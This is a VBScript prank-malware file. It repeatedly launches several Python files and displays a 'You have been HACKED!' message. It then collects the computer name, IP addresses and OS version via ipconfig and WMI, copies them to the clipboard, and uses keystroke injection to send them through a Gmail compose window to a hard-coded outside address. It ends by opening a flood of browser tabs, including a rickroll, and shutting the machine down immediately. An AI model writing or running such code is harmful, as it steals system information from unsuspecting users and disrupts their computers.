Option Explicit




Dim filePath
filePath = "alien.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing



filePath = "alien.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


filePath = "alien.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing

WScript.Sleep 500

filePath = "alien2.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing



filePath = "alien2.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


filePath = "alien2.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


WScript.Sleep 500



filePath = "alien3.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing



filePath = "alien3.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


filePath = "alien3.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


WScript.Sleep 500


filePath = "alien4.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing



filePath = "alien4.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing


filePath = "alien4.py"  ' Specify your file path here

' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the file
objShell.Run Chr(34) & filePath & Chr(34)

' Clean up
Set objShell = Nothing








MsgBox "You have been HACKED!", vbExclamation, "Fool!"



WScript.Sleep 500






Dim WshShell, objShell, objFSO, objFile, strSysInfo
Dim strFilePath , strClipboardData , fso, chromePath32,chromePath64
Dim videoURL,chromePath, clipboardData, recipientEmail, subject
Dim tempFile, clipboard, fileContent, objFAO




set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.run("cmd.exe")
WScript.Sleep 500
WshShell.SendKeys "ipconfig" 
WshShell.SendKeys("{Enter}")
WScript.Sleep 500


WshShell.run("cmd.exe")
WScript.Sleep 500
WshShell.SendKeys "ipconfig" 
WshShell.SendKeys("{Enter}")
WScript.Sleep 500


WshShell.run("cmd.exe")
WScript.Sleep 500
WshShell.SendKeys "ipconfig" 
WshShell.SendKeys("{Enter}")
WScript.Sleep 500


WshShell.run("cmd.exe")
WScript.Sleep 500
WshShell.SendKeys "ipconfig" 
WshShell.SendKeys("{Enter}")
WScript.Sleep 500






 

Dim file

' Create WScript shell object to execute commands
Set WshShell = CreateObject("WScript.Shell")

' Create FileSystemObject to work with files
Set objFAO = CreateObject("Scripting.FileSystemObject")

' Define a temporary file to store command output
tempFile = objFAO.GetSpecialFolder(2) & "\ipconfig_output.txt" ' Temp folder

' Run the ipconfig command and save output to temp file
WshShell.Run "cmd.exe /c ipconfig > " & tempFile, 0, True ' Run hidden

' Wait for the command to finish and check if the file exists
If objFAO.FileExists(tempFile) Then
    
    ' Read the content of the temp file
 Set file = objFAO.OpenTextFile(tempFile, 1)
    fileContent = file.ReadAll
    file.Close

    ' Copy the content to the clipboard
    Set clipboard = CreateObject("htmlfile")
    clipboard.ParentWindow.ClipboardData.SetData "Text", fileContent

    ' Optional: Notify that the data has been copied
    WshShell.Popup "IP configuration has been copied to clipboard.", 3, "Info"

    WScript.Sleep 5000
    WshShell.SendKeys("{ENTER}")

    ' Clean up by deleting the temp file
    objFAO.DeleteFile tempFile
Else
    WshShell.Popup "Failed to retrieve IP information.", 5, "Error"
End If




Dim objWMIService, colNetAdapters, ipAddresses, objNetAdapter, ipAddress, computerName, colOperatingSystems, objOperatingSystem,  osVersion
Dim details
' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Create a Command object to run the command line
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Get the IP Address
Set colNetAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True")
ipAddresses = ""
For Each objNetAdapter in colNetAdapters
    If Not IsNull(objNetAdapter.IPAddress) Then
        For Each ipAddress in objNetAdapter.IPAddress
            ipAddresses = ipAddresses & ipAddress & vbCrLf
        Next
    End If
Next

' Get the Computer Name
computerName = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")

' Get the OS version
Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
    osVersion = objOperatingSystem.Caption & " " & objOperatingSystem.Version
Next

' Combine the details
details = "Computer Name: " & computerName & vbCrLf & _
          "IP Addresses: " & vbCrLf & ipAddresses & _
          "Operating System: " & osVersion

' Create a temporary file path
tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\PCDetails.txt"

' Create the temporary file
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(tempFile, True)
objFile.Write details
objFile.Close

' Use clip.exe to copy the file content to the clipboard
objShell.Run "cmd /c clip < """ & tempFile & """", 0, True

' Notify user
MsgBox "PC details copied to clipboard!", vbInformation

' Clean up temporary file
objFSO.DeleteFile tempFile





Set objShell = CreateObject("WScript.Shell")

objShell.SendKeys "{ESC}"

' Clean up
Set objShell = Nothing




Dim WshShelll

' Create WScript shell object
Set WshShelll = CreateObject("WScript.Shell")

' Define the recipient email address and subject
recipientEmail = "attharva.cyber@gmail.com"
subject = "Subject of the email"

' Retrieve the clipboard content

Set WshShell = CreateObject("WScript.Shell")




' Open the default browser and navigate to Gmail
WshShelll.Run "https://mail.google.com/mail/u/0/?view=cm&fs=1&to=" & recipientEmail & "&su=" & subject & "&body=" & clipboardData



WScript.Sleep 5000 ' Wait for Notepad to open

' Send the paste command
WshShell.SendKeys "^v" ' This simulates Ctrl + V for paste




' Optional: Wait for the browser to load Gmail
WScript.Sleep 5000 ' Wait 5 seconds (adjust if necessary)

WshShelll.SendKeys("{TAB}")
WshShelll.SendKeys("{Enter}")

' The above URL will automatically open a new Gmail draft with the recipient, subject, and clipboard content



WScript.Sleep 5000





' Create objects for WshShell and FileSystemObject
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Define paths for Chrome installation
chromePath64 = "C:\Program Files\Google\Chrome\Application\chrome.exe"
chromePath32 = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"

' Rick Astley's "Never Gonna Give You Up" video URL
videoURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

' Check if the 64-bit Chrome exists
If fso.FileExists(chromePath64) Then
    chromePath = chromePath64
' If not, check for 32-bit Chrome
ElseIf fso.FileExists(chromePath32) Then
    chromePath = chromePath32
' If Chrome is not found, display a message and exit
Else
    MsgBox "Google Chrome is not installed in the default locations."
    WScript.Quit
End If

' Open Chrome and play the YouTube video
WshShell.Run """" & chromePath & """ " & videoURL, 1, False



Dim randomURLs

Set objShell = CreateObject("WScript.Shell")

' List of random URLs, including 5 random YouTube songs
randomURLs = Array( _
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ", _  
    "https://www.youtube.com/watch?v=3JZ_D3ELwOQ", _  
    "https://www.youtube.com/watch?v=9bZkp7q19f0", _  
    "https://www.youtube.com/watch?v=kJQP7kiw5Fk", _  
    "https://www.youtube.com/watch?v=RgKAFK5djSk", _  
    "https://www.reddit.com", _                      
    "https://www.wikipedia.org", _                  
    "https://www.github.com", _                      
    "https://www.stackoverflow.com", _             
    "https://news.google.com"    _                    
)

' Loop to open all 10 tabs
Dim i
For i = 0 To UBound(randomURLs)
    objShell.Run "chrome.exe " & randomURLs(i)
    WScript.Sleep 2000 ' Wait for 2 seconds before opening the next tab
Next

' Wait for 5 seconds after opening the last tab
WScript.Sleep 5000

' Shut down the PC
objShell.Run "shutdown.exe -s -t 0"





